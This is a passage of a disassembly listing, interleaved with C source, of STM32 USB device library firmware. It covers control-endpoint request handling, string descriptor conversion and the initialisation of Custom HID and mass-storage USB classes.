 800c292:	6839      	ldr	r1, [r7, #0]
 800c294:	6878      	ldr	r0, [r7, #4]
 800c296:	f000 f860 	bl	800c35a <USBD_CtlError>
}
 800c29a:	bf00      	nop
 800c29c:	3708      	adds	r7, #8
 800c29e:	46bd      	mov	sp, r7
 800c2a0:	bd80      	pop	{r7, pc}

0800c2a2 <USBD_ClrFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_ClrFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c2a2:	b580      	push	{r7, lr}
 800c2a4:	b082      	sub	sp, #8
 800c2a6:	af00      	add	r7, sp, #0
 800c2a8:	6078      	str	r0, [r7, #4]
 800c2aa:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c2ac:	687b      	ldr	r3, [r7, #4]
 800c2ae:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c2b2:	b2db      	uxtb	r3, r3
 800c2b4:	3b01      	subs	r3, #1
 800c2b6:	2b02      	cmp	r3, #2
 800c2b8:	d80b      	bhi.n	800c2d2 <USBD_ClrFeature+0x30>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c2ba:	683b      	ldr	r3, [r7, #0]
 800c2bc:	885b      	ldrh	r3, [r3, #2]
 800c2be:	2b01      	cmp	r3, #1
 800c2c0:	d10c      	bne.n	800c2dc <USBD_ClrFeature+0x3a>
      {
        pdev->dev_remote_wakeup = 0U;
 800c2c2:	687b      	ldr	r3, [r7, #4]
 800c2c4:	2200      	movs	r2, #0
 800c2c6:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
        (void)USBD_CtlSendStatus(pdev);
 800c2ca:	6878      	ldr	r0, [r7, #4]
 800c2cc:	f000 f910 	bl	800c4f0 <USBD_CtlSendStatus>
      }
      break;
 800c2d0:	e004      	b.n	800c2dc <USBD_ClrFeature+0x3a>

    default:
      USBD_CtlError(pdev, req);
 800c2d2:	6839      	ldr	r1, [r7, #0]
 800c2d4:	6878      	ldr	r0, [r7, #4]
 800c2d6:	f000 f840 	bl	800c35a <USBD_CtlError>
      break;
 800c2da:	e000      	b.n	800c2de <USBD_ClrFeature+0x3c>
      break;
 800c2dc:	bf00      	nop
  }
}
 800c2de:	bf00      	nop
 800c2e0:	3708      	adds	r7, #8
 800c2e2:	46bd      	mov	sp, r7
 800c2e4:	bd80      	pop	{r7, pc}

0800c2e6 <USBD_ParseSetupRequest>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_ParseSetupRequest(USBD_SetupReqTypedef *req, uint8_t *pdata)
{
 800c2e6:	b580      	push	{r7, lr}
 800c2e8:	b084      	sub	sp, #16
 800c2ea:	af00      	add	r7, sp, #0
 800c2ec:	6078      	str	r0, [r7, #4]
 800c2ee:	6039      	str	r1, [r7, #0]
  uint8_t *pbuff = pdata;
 800c2f0:	683b      	ldr	r3, [r7, #0]
 800c2f2:	60fb      	str	r3, [r7, #12]

  req->bmRequest = *(uint8_t *)(pbuff);
 800c2f4:	68fb      	ldr	r3, [r7, #12]
 800c2f6:	781a      	ldrb	r2, [r3, #0]
 800c2f8:	687b      	ldr	r3, [r7, #4]
 800c2fa:	701a      	strb	r2, [r3, #0]

  pbuff++;
 800c2fc:	68fb      	ldr	r3, [r7, #12]
 800c2fe:	3301      	adds	r3, #1
 800c300:	60fb      	str	r3, [r7, #12]
  req->bRequest = *(uint8_t *)(pbuff);
 800c302:	68fb      	ldr	r3, [r7, #12]
 800c304:	781a      	ldrb	r2, [r3, #0]
 800c306:	687b      	ldr	r3, [r7, #4]
 800c308:	705a      	strb	r2, [r3, #1]

  pbuff++;
 800c30a:	68fb      	ldr	r3, [r7, #12]
 800c30c:	3301      	adds	r3, #1
 800c30e:	60fb      	str	r3, [r7, #12]
  req->wValue = SWAPBYTE(pbuff);
 800c310:	68f8      	ldr	r0, [r7, #12]
 800c312:	f7ff fa16 	bl	800b742 <SWAPBYTE>
 800c316:	4603      	mov	r3, r0
 800c318:	461a      	mov	r2, r3
 800c31a:	687b      	ldr	r3, [r7, #4]
 800c31c:	805a      	strh	r2, [r3, #2]

  pbuff++;
 800c31e:	68fb      	ldr	r3, [r7, #12]
 800c320:	3301      	adds	r3, #1
 800c322:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c324:	68fb      	ldr	r3, [r7, #12]
 800c326:	3301      	adds	r3, #1
 800c328:	60fb      	str	r3, [r7, #12]
  req->wIndex = SWAPBYTE(pbuff);
 800c32a:	68f8      	ldr	r0, [r7, #12]
 800c32c:	f7ff fa09 	bl	800b742 <SWAPBYTE>
 800c330:	4603      	mov	r3, r0
 800c332:	461a      	mov	r2, r3
 800c334:	687b      	ldr	r3, [r7, #4]
 800c336:	809a      	strh	r2, [r3, #4]

  pbuff++;
 800c338:	68fb      	ldr	r3, [r7, #12]
 800c33a:	3301      	adds	r3, #1
 800c33c:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c33e:	68fb      	ldr	r3, [r7, #12]
 800c340:	3301      	adds	r3, #1
 800c342:	60fb      	str	r3, [r7, #12]
  req->wLength = SWAPBYTE(pbuff);
 800c344:	68f8      	ldr	r0, [r7, #12]
 800c346:	f7ff f9fc 	bl	800b742 <SWAPBYTE>
 800c34a:	4603      	mov	r3, r0
 800c34c:	461a      	mov	r2, r3
 800c34e:	687b      	ldr	r3, [r7, #4]
 800c350:	80da      	strh	r2, [r3, #6]
}
 800c352:	bf00      	nop
 800c354:	3710      	adds	r7, #16
 800c356:	46bd      	mov	sp, r7
 800c358:	bd80      	pop	{r7, pc}

0800c35a <USBD_CtlError>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_CtlError(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c35a:	b580      	push	{r7, lr}
 800c35c:	b082      	sub	sp, #8
 800c35e:	af00      	add	r7, sp, #0
 800c360:	6078      	str	r0, [r7, #4]
 800c362:	6039      	str	r1, [r7, #0]
  UNUSED(req);

  (void)USBD_LL_StallEP(pdev, 0x80U);
 800c364:	2180      	movs	r1, #128	; 0x80
 800c366:	6878      	ldr	r0, [r7, #4]
 800c368:	f000 fd6a 	bl	800ce40 <USBD_LL_StallEP>
  (void)USBD_LL_StallEP(pdev, 0U);
 800c36c:	2100      	movs	r1, #0
 800c36e:	6878      	ldr	r0, [r7, #4]
 800c370:	f000 fd66 	bl	800ce40 <USBD_LL_StallEP>
}
 800c374:	bf00      	nop
 800c376:	3708      	adds	r7, #8
 800c378:	46bd      	mov	sp, r7
 800c37a:	bd80      	pop	{r7, pc}

0800c37c <USBD_GetString>:
  * @param  unicode : Formatted string buffer (unicode)
  * @param  len : descriptor length
  * @retval None
  */
void USBD_GetString(uint8_t *desc, uint8_t *unicode, uint16_t *len)
{
 800c37c:	b580      	push	{r7, lr}
 800c37e:	b086      	sub	sp, #24
 800c380:	af00      	add	r7, sp, #0
 800c382:	60f8      	str	r0, [r7, #12]
 800c384:	60b9      	str	r1, [r7, #8]
 800c386:	607a      	str	r2, [r7, #4]
  uint8_t idx = 0U;
 800c388:	2300      	movs	r3, #0
 800c38a:	75fb      	strb	r3, [r7, #23]
  uint8_t *pdesc;

  if (desc == NULL)
 800c38c:	68fb      	ldr	r3, [r7, #12]
 800c38e:	2b00      	cmp	r3, #0
 800c390:	d036      	beq.n	800c400 <USBD_GetString+0x84>
  {
    return;
  }

  pdesc = desc;
 800c392:	68fb      	ldr	r3, [r7, #12]
 800c394:	613b      	str	r3, [r7, #16]
  *len = ((uint16_t)USBD_GetLen(pdesc) * 2U) + 2U;
 800c396:	6938      	ldr	r0, [r7, #16]
 800c398:	f000 f836 	bl	800c408 <USBD_GetLen>
 800c39c:	4603      	mov	r3, r0
 800c39e:	3301      	adds	r3, #1
 800c3a0:	b29b      	uxth	r3, r3
 800c3a2:	005b      	lsls	r3, r3, #1
 800c3a4:	b29a      	uxth	r2, r3
 800c3a6:	687b      	ldr	r3, [r7, #4]
 800c3a8:	801a      	strh	r2, [r3, #0]

  unicode[idx] = *(uint8_t *)len;
 800c3aa:	7dfb      	ldrb	r3, [r7, #23]
 800c3ac:	68ba      	ldr	r2, [r7, #8]
 800c3ae:	4413      	add	r3, r2
 800c3b0:	687a      	ldr	r2, [r7, #4]
 800c3b2:	7812      	ldrb	r2, [r2, #0]
 800c3b4:	701a      	strb	r2, [r3, #0]
  idx++;
 800c3b6:	7dfb      	ldrb	r3, [r7, #23]
 800c3b8:	3301      	adds	r3, #1
 800c3ba:	75fb      	strb	r3, [r7, #23]
  unicode[idx] = USB_DESC_TYPE_STRING;
 800c3bc:	7dfb      	ldrb	r3, [r7, #23]
 800c3be:	68ba      	ldr	r2, [r7, #8]
 800c3c0:	4413      	add	r3, r2
 800c3c2:	2203      	movs	r2, #3
 800c3c4:	701a      	strb	r2, [r3, #0]
  idx++;
 800c3c6:	7dfb      	ldrb	r3, [r7, #23]
 800c3c8:	3301      	adds	r3, #1
 800c3ca:	75fb      	strb	r3, [r7, #23]

  while (*pdesc != (uint8_t)'\0')
 800c3cc:	e013      	b.n	800c3f6 <USBD_GetString+0x7a>
  {
    unicode[idx] = *pdesc;
 800c3ce:	7dfb      	ldrb	r3, [r7, #23]
 800c3d0:	68ba      	ldr	r2, [r7, #8]
 800c3d2:	4413      	add	r3, r2
 800c3d4:	693a      	ldr	r2, [r7, #16]
 800c3d6:	7812      	ldrb	r2, [r2, #0]
 800c3d8:	701a      	strb	r2, [r3, #0]
    pdesc++;
 800c3da:	693b      	ldr	r3, [r7, #16]
 800c3dc:	3301      	adds	r3, #1
 800c3de:	613b      	str	r3, [r7, #16]
    idx++;
 800c3e0:	7dfb      	ldrb	r3, [r7, #23]
 800c3e2:	3301      	adds	r3, #1
 800c3e4:	75fb      	strb	r3, [r7, #23]

    unicode[idx] = 0U;
 800c3e6:	7dfb      	ldrb	r3, [r7, #23]
 800c3e8:	68ba      	ldr	r2, [r7, #8]
 800c3ea:	4413      	add	r3, r2
 800c3ec:	2200      	movs	r2, #0
 800c3ee:	701a      	strb	r2, [r3, #0]
    idx++;
 800c3f0:	7dfb      	ldrb	r3, [r7, #23]
 800c3f2:	3301      	adds	r3, #1
 800c3f4:	75fb      	strb	r3, [r7, #23]
  while (*pdesc != (uint8_t)'\0')
 800c3f6:	693b      	ldr	r3, [r7, #16]
 800c3f8:	781b      	ldrb	r3, [r3, #0]
 800c3fa:	2b00      	cmp	r3, #0
 800c3fc:	d1e7      	bne.n	800c3ce <USBD_GetString+0x52>
 800c3fe:	e000      	b.n	800c402 <USBD_GetString+0x86>
    return;
 800c400:	bf00      	nop
  }
}
 800c402:	3718      	adds	r7, #24
 800c404:	46bd      	mov	sp, r7
 800c406:	bd80      	pop	{r7, pc}

0800c408 <USBD_GetLen>:
  *         return the string length
   * @param  buf : pointer to the ascii string buffer
  * @retval string length
  */
static uint8_t USBD_GetLen(uint8_t *buf)
{
 800c408:	b480      	push	{r7}
 800c40a:	b085      	sub	sp, #20
 800c40c:	af00      	add	r7, sp, #0
 800c40e:	6078      	str	r0, [r7, #4]
  uint8_t  len = 0U;
 800c410:	2300      	movs	r3, #0
 800c412:	73fb      	strb	r3, [r7, #15]
  uint8_t *pbuff = buf;
 800c414:	687b      	ldr	r3, [r7, #4]
 800c416:	60bb      	str	r3, [r7, #8]

  while (*pbuff != (uint8_t)'\0')
 800c418:	e005      	b.n	800c426 <USBD_GetLen+0x1e>
  {
    len++;
 800c41a:	7bfb      	ldrb	r3, [r7, #15]
 800c41c:	3301      	adds	r3, #1
 800c41e:	73fb      	strb	r3, [r7, #15]
    pbuff++;
 800c420:	68bb      	ldr	r3, [r7, #8]
 800c422:	3301      	adds	r3, #1
 800c424:	60bb      	str	r3, [r7, #8]
  while (*pbuff != (uint8_t)'\0')
 800c426:	68bb      	ldr	r3, [r7, #8]
 800c428:	781b      	ldrb	r3, [r3, #0]
 800c42a:	2b00      	cmp	r3, #0
 800c42c:	d1f5      	bne.n	800c41a <USBD_GetLen+0x12>
  }

  return len;
 800c42e:	7bfb      	ldrb	r3, [r7, #15]
}
 800c430:	4618      	mov	r0, r3
 800c432:	3714      	adds	r7, #20
 800c434:	46bd      	mov	sp, r7
 800c436:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c43a:	4770      	bx	lr

0800c43c <USBD_CtlSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendData(USBD_HandleTypeDef *pdev,
                                    uint8_t *pbuf, uint32_t len)
{
 800c43c:	b580      	push	{r7, lr}
 800c43e:	b084      	sub	sp, #16
 800c440:	af00      	add	r7, sp, #0
 800c442:	60f8      	str	r0, [r7, #12]
 800c444:	60b9      	str	r1, [r7, #8]
 800c446:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_IN;
 800c448:	68fb      	ldr	r3, [r7, #12]
 800c44a:	2202      	movs	r2, #2
 800c44c:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_in[0].total_length = len;
 800c450:	68fb      	ldr	r3, [r7, #12]
 800c452:	687a      	ldr	r2, [r7, #4]
 800c454:	619a      	str	r2, [r3, #24]

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_in[0].rem_length = 0U;
#else
  pdev->ep_in[0].rem_length = len;
 800c456:	68fb      	ldr	r3, [r7, #12]
 800c458:	687a      	ldr	r2, [r7, #4]
 800c45a:	61da      	str	r2, [r3, #28]
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c45c:	687b      	ldr	r3, [r7, #4]
 800c45e:	68ba      	ldr	r2, [r7, #8]
 800c460:	2100      	movs	r1, #0
 800c462:	68f8      	ldr	r0, [r7, #12]
 800c464:	f000 fdbc 	bl	800cfe0 <USBD_LL_Transmit>

  return USBD_OK;
 800c468:	2300      	movs	r3, #0
}
 800c46a:	4618      	mov	r0, r3
 800c46c:	3710      	adds	r7, #16
 800c46e:	46bd      	mov	sp, r7
 800c470:	bd80      	pop	{r7, pc}

0800c472 <USBD_CtlContinueSendData>:
  * @param  len: length of data to be sent
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueSendData(USBD_HandleTypeDef *pdev,
                                            uint8_t *pbuf, uint32_t len)
{
 800c472:	b580      	push	{r7, lr}
 800c474:	b084      	sub	sp, #16
 800c476:	af00      	add	r7, sp, #0
 800c478:	60f8      	str	r0, [r7, #12]
 800c47a:	60b9      	str	r1, [r7, #8]
 800c47c:	607a      	str	r2, [r7, #4]
  /* Start the next transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, pbuf, len);
 800c47e:	687b      	ldr	r3, [r7, #4]
 800c480:	68ba      	ldr	r2, [r7, #8]
 800c482:	2100      	movs	r1, #0
 800c484:	68f8      	ldr	r0, [r7, #12]
 800c486:	f000 fdab 	bl	800cfe0 <USBD_LL_Transmit>

  return USBD_OK;
 800c48a:	2300      	movs	r3, #0
}
 800c48c:	4618      	mov	r0, r3
 800c48e:	3710      	adds	r7, #16
 800c490:	46bd      	mov	sp, r7
 800c492:	bd80      	pop	{r7, pc}

0800c494 <USBD_CtlPrepareRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlPrepareRx(USBD_HandleTypeDef *pdev,
                                     uint8_t *pbuf, uint32_t len)
{
 800c494:	b580      	push	{r7, lr}
 800c496:	b084      	sub	sp, #16
 800c498:	af00      	add	r7, sp, #0
 800c49a:	60f8      	str	r0, [r7, #12]
 800c49c:	60b9      	str	r1, [r7, #8]
 800c49e:	607a      	str	r2, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_DATA_OUT;
 800c4a0:	68fb      	ldr	r3, [r7, #12]
 800c4a2:	2203      	movs	r2, #3
 800c4a4:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294
  pdev->ep_out[0].total_length = len;
 800c4a8:	68fb      	ldr	r3, [r7, #12]
 800c4aa:	687a      	ldr	r2, [r7, #4]
 800c4ac:	f8c3 2158 	str.w	r2, [r3, #344]	; 0x158

#ifdef USBD_AVOID_PACKET_SPLIT_MPS
  pdev->ep_out[0].rem_length = 0U;
#else
  pdev->ep_out[0].rem_length = len;
 800c4b0:	68fb      	ldr	r3, [r7, #12]
 800c4b2:	687a      	ldr	r2, [r7, #4]
 800c4b4:	f8c3 215c 	str.w	r2, [r3, #348]	; 0x15c
#endif /* USBD_AVOID_PACKET_SPLIT_MPS */

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c4b8:	687b      	ldr	r3, [r7, #4]
 800c4ba:	68ba      	ldr	r2, [r7, #8]
 800c4bc:	2100      	movs	r1, #0
 800c4be:	68f8      	ldr	r0, [r7, #12]
 800c4c0:	f000 fdc6 	bl	800d050 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c4c4:	2300      	movs	r3, #0
}
 800c4c6:	4618      	mov	r0, r3
 800c4c8:	3710      	adds	r7, #16
 800c4ca:	46bd      	mov	sp, r7
 800c4cc:	bd80      	pop	{r7, pc}

0800c4ce <USBD_CtlContinueRx>:
  * @param  len: length of data to be received
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlContinueRx(USBD_HandleTypeDef *pdev,
                                      uint8_t *pbuf, uint32_t len)
{
 800c4ce:	b580      	push	{r7, lr}
 800c4d0:	b084      	sub	sp, #16
 800c4d2:	af00      	add	r7, sp, #0
 800c4d4:	60f8      	str	r0, [r7, #12]
 800c4d6:	60b9      	str	r1, [r7, #8]
 800c4d8:	607a      	str	r2, [r7, #4]
  (void)USBD_LL_PrepareReceive(pdev, 0U, pbuf, len);
 800c4da:	687b      	ldr	r3, [r7, #4]
 800c4dc:	68ba      	ldr	r2, [r7, #8]
 800c4de:	2100      	movs	r1, #0
 800c4e0:	68f8      	ldr	r0, [r7, #12]
 800c4e2:	f000 fdb5 	bl	800d050 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c4e6:	2300      	movs	r3, #0
}
 800c4e8:	4618      	mov	r0, r3
 800c4ea:	3710      	adds	r7, #16
 800c4ec:	46bd      	mov	sp, r7
 800c4ee:	bd80      	pop	{r7, pc}

0800c4f0 <USBD_CtlSendStatus>:
  *         send zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlSendStatus(USBD_HandleTypeDef *pdev)
{
 800c4f0:	b580      	push	{r7, lr}
 800c4f2:	b082      	sub	sp, #8
 800c4f4:	af00      	add	r7, sp, #0
 800c4f6:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_IN;
 800c4f8:	687b      	ldr	r3, [r7, #4]
 800c4fa:	2204      	movs	r2, #4
 800c4fc:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_Transmit(pdev, 0x00U, NULL, 0U);
 800c500:	2300      	movs	r3, #0
 800c502:	2200      	movs	r2, #0
 800c504:	2100      	movs	r1, #0
 800c506:	6878      	ldr	r0, [r7, #4]
 800c508:	f000 fd6a 	bl	800cfe0 <USBD_LL_Transmit>

  return USBD_OK;
 800c50c:	2300      	movs	r3, #0
}
 800c50e:	4618      	mov	r0, r3
 800c510:	3708      	adds	r7, #8
 800c512:	46bd      	mov	sp, r7
 800c514:	bd80      	pop	{r7, pc}

0800c516 <USBD_CtlReceiveStatus>:
  *         receive zero lzngth packet on the ctl pipe
  * @param  pdev: device instance
  * @retval status
  */
USBD_StatusTypeDef USBD_CtlReceiveStatus(USBD_HandleTypeDef *pdev)
{
 800c516:	b580      	push	{r7, lr}
 800c518:	b082      	sub	sp, #8
 800c51a:	af00      	add	r7, sp, #0
 800c51c:	6078      	str	r0, [r7, #4]
  /* Set EP0 State */
  pdev->ep0_state = USBD_EP0_STATUS_OUT;
 800c51e:	687b      	ldr	r3, [r7, #4]
 800c520:	2205      	movs	r2, #5
 800c522:	f8c3 2294 	str.w	r2, [r3, #660]	; 0x294

  /* Start the transfer */
  (void)USBD_LL_PrepareReceive(pdev, 0U, NULL, 0U);
 800c526:	2300      	movs	r3, #0
 800c528:	2200      	movs	r2, #0
 800c52a:	2100      	movs	r1, #0
 800c52c:	6878      	ldr	r0, [r7, #4]
 800c52e:	f000 fd8f 	bl	800d050 <USBD_LL_PrepareReceive>

  return USBD_OK;
 800c532:	2300      	movs	r3, #0
}
 800c534:	4618      	mov	r0, r3
 800c536:	3708      	adds	r7, #8
 800c538:	46bd      	mov	sp, r7
 800c53a:	bd80      	pop	{r7, pc}

0800c53c <MX_USB_DEVICE_Init>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init(void)
{
 800c53c:	b580      	push	{r7, lr}
 800c53e:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c540:	2200      	movs	r2, #0
 800c542:	4912      	ldr	r1, [pc, #72]	; (800c58c <MX_USB_DEVICE_Init+0x50>)
 800c544:	4812      	ldr	r0, [pc, #72]	; (800c590 <MX_USB_DEVICE_Init+0x54>)
 800c546:	f7fe fd68 	bl	800b01a <USBD_Init>
 800c54a:	4603      	mov	r3, r0
 800c54c:	2b00      	cmp	r3, #0
 800c54e:	d001      	beq.n	800c554 <MX_USB_DEVICE_Init+0x18>
  {
    Error_Handler();
 800c550:	f7f4 fc7e 	bl	8000e50 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS, &USBD_CUSTOM_HID) != USBD_OK)
 800c554:	490f      	ldr	r1, [pc, #60]	; (800c594 <MX_USB_DEVICE_Init+0x58>)
 800c556:	480e      	ldr	r0, [pc, #56]	; (800c590 <MX_USB_DEVICE_Init+0x54>)
 800c558:	f7fe fd8f 	bl	800b07a <USBD_RegisterClass>
 800c55c:	4603      	mov	r3, r0
 800c55e:	2b00      	cmp	r3, #0
 800c560:	d001      	beq.n	800c566 <MX_USB_DEVICE_Init+0x2a>
  {
    Error_Handler();
 800c562:	f7f4 fc75 	bl	8000e50 <Error_Handler>
  }
  if (USBD_CUSTOM_HID_RegisterInterface(&hUsbDeviceFS, &USBD_CustomHID_fops_FS) != USBD_OK)
 800c566:	490c      	ldr	r1, [pc, #48]	; (800c598 <MX_USB_DEVICE_Init+0x5c>)
 800c568:	4809      	ldr	r0, [pc, #36]	; (800c590 <MX_USB_DEVICE_Init+0x54>)
 800c56a:	f7fc fca5 	bl	8008eb8 <USBD_CUSTOM_HID_RegisterInterface>
 800c56e:	4603      	mov	r3, r0
 800c570:	2b00      	cmp	r3, #0
 800c572:	d001      	beq.n	800c578 <MX_USB_DEVICE_Init+0x3c>
  {
    Error_Handler();
 800c574:	f7f4 fc6c 	bl	8000e50 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS) != USBD_OK)
 800c578:	4805      	ldr	r0, [pc, #20]	; (800c590 <MX_USB_DEVICE_Init+0x54>)
 800c57a:	f7fe fdb4 	bl	800b0e6 <USBD_Start>
 800c57e:	4603      	mov	r3, r0
 800c580:	2b00      	cmp	r3, #0
 800c582:	d001      	beq.n	800c588 <MX_USB_DEVICE_Init+0x4c>
  {
    Error_Handler();
 800c584:	f7f4 fc64 	bl	8000e50 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */
  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c588:	bf00      	nop
 800c58a:	bd80      	pop	{r7, pc}
 800c58c:	200001ac 	.word	0x200001ac
 800c590:	200003c0 	.word	0x200003c0
 800c594:	2000002c 	.word	0x2000002c
 800c598:	2000019c 	.word	0x2000019c

0800c59c <MX_USB_DEVICE_Init_MSC>:
/**
  * Init USB device Library, add supported class and start the library
  * @retval None
  */
void MX_USB_DEVICE_Init_MSC(void)
{
 800c59c:	b580      	push	{r7, lr}
 800c59e:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN USB_DEVICE_Init_PreTreatment */

  /* USER CODE END USB_DEVICE_Init_PreTreatment */

  /* Init Device Library, add supported class and start the library. */
  if (USBD_Init(&hUsbDeviceFS_MSC, &FS_Desc, DEVICE_FS) != USBD_OK)
 800c5a0:	2200      	movs	r2, #0
 800c5a2:	4912      	ldr	r1, [pc, #72]	; (800c5ec <MX_USB_DEVICE_Init_MSC+0x50>)
 800c5a4:	4812      	ldr	r0, [pc, #72]	; (800c5f0 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c5a6:	f7fe fd38 	bl	800b01a <USBD_Init>
 800c5aa:	4603      	mov	r3, r0
 800c5ac:	2b00      	cmp	r3, #0
 800c5ae:	d001      	beq.n	800c5b4 <MX_USB_DEVICE_Init_MSC+0x18>
  {
    Error_Handler();
 800c5b0:	f7f4 fc4e 	bl	8000e50 <Error_Handler>
  }
  if (USBD_RegisterClass(&hUsbDeviceFS_MSC, &USBD_MSC) != USBD_OK)
 800c5b4:	490f      	ldr	r1, [pc, #60]	; (800c5f4 <MX_USB_DEVICE_Init_MSC+0x58>)
 800c5b6:	480e      	ldr	r0, [pc, #56]	; (800c5f0 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c5b8:	f7fe fd5f 	bl	800b07a <USBD_RegisterClass>
 800c5bc:	4603      	mov	r3, r0
 800c5be:	2b00      	cmp	r3, #0
 800c5c0:	d001      	beq.n	800c5c6 <MX_USB_DEVICE_Init_MSC+0x2a>
  {
    Error_Handler();
 800c5c2:	f7f4 fc45 	bl	8000e50 <Error_Handler>
  }
  if (USBD_MSC_RegisterStorage(&hUsbDeviceFS_MSC, &USBD_Storage_Interface_fops_FS) != USBD_OK)
 800c5c6:	490c      	ldr	r1, [pc, #48]	; (800c5f8 <MX_USB_DEVICE_Init_MSC+0x5c>)
 800c5c8:	4809      	ldr	r0, [pc, #36]	; (800c5f0 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c5ca:	f7fc ff27 	bl	800941c <USBD_MSC_RegisterStorage>
 800c5ce:	4603      	mov	r3, r0
 800c5d0:	2b00      	cmp	r3, #0
 800c5d2:	d001      	beq.n	800c5d8 <MX_USB_DEVICE_Init_MSC+0x3c>
  {
    Error_Handler();
 800c5d4:	f7f4 fc3c 	bl	8000e50 <Error_Handler>
  }
  if (USBD_Start(&hUsbDeviceFS_MSC) != USBD_OK)
 800c5d8:	4805      	ldr	r0, [pc, #20]	; (800c5f0 <MX_USB_DEVICE_Init_MSC+0x54>)
 800c5da:	f7fe fd84 	bl	800b0e6 <USBD_Start>
 800c5de:	4603      	mov	r3, r0
 800c5e0:	2b00      	cmp	r3, #0
 800c5e2:	d001      	beq.n	800c5e8 <MX_USB_DEVICE_Init_MSC+0x4c>
  {
    Error_Handler();
 800c5e4:	f7f4 fc34 	bl	8000e50 <Error_Handler>
  }
  /* USER CODE BEGIN USB_DEVICE_Init_PostTreatment */

  /* USER CODE END USB_DEVICE_Init_PostTreatment */
}
 800c5e8:	bf00      	nop
 800c5ea:	bd80      	pop	{r7, pc}
 800c5ec:	200001ac 	.word	0x200001ac
 800c5f0:	2000069c 	.word	0x2000069c
 800c5f4:	200000a8 	.word	0x200000a8
 800c5f8:	20000220 	.word	0x20000220

0800c5fc <CUSTOM_HID_Init_FS>:
/**
  * @brief  Initializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_Init_FS(void)
{
 800c5fc:	b480      	push	{r7}
 800c5fe:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 4 */
  return (USBD_OK);
 800c600:	2300      	movs	r3, #0
  /* USER CODE END 4 */
}
 800c602:	4618      	mov	r0, r3
 800c604:	46bd      	mov	sp, r7
 800c606:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c60a:	4770      	bx	lr

0800c60c <CUSTOM_HID_DeInit_FS>:
/**
  * @brief  DeInitializes the CUSTOM HID media low layer
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_DeInit_FS(void)
{
 800c60c:	b480      	push	{r7}
 800c60e:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 5 */
  return (USBD_OK);
 800c610:	2300      	movs	r3, #0
  /* USER CODE END 5 */
}
 800c612:	4618      	mov	r0, r3
 800c614:	46bd      	mov	sp, r7
 800c616:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c61a:	4770      	bx	lr

0800c61c <CUSTOM_HID_OutEvent_FS>:
  * @param  event_idx: Event index
  * @param  state: Event state
  * @retval USBD_OK if all operations are OK else USBD_FAIL
  */
static int8_t CUSTOM_HID_OutEvent_FS(uint8_t event_idx, uint8_t state)
{
 800c61c:	b580      	push	{r7, lr}
 800c61e:	b082      	sub	sp, #8
 800c620:	af00      	add	r7, sp, #0
 800c622:	4603      	mov	r3, r0
 800c624:	460a      	mov	r2, r1
 800c626:	71fb      	strb	r3, [r7, #7]
 800c628:	4613      	mov	r3, r2
 800c62a:	71bb      	strb	r3, [r7, #6]
  /* USER CODE BEGIN 6 */
  UNUSED(event_idx);
  UNUSED(state);

  /* Start next USB packet transfer once data processing is completed */
  USBD_CUSTOM_HID_ReceivePacket(&hUsbDeviceFS);
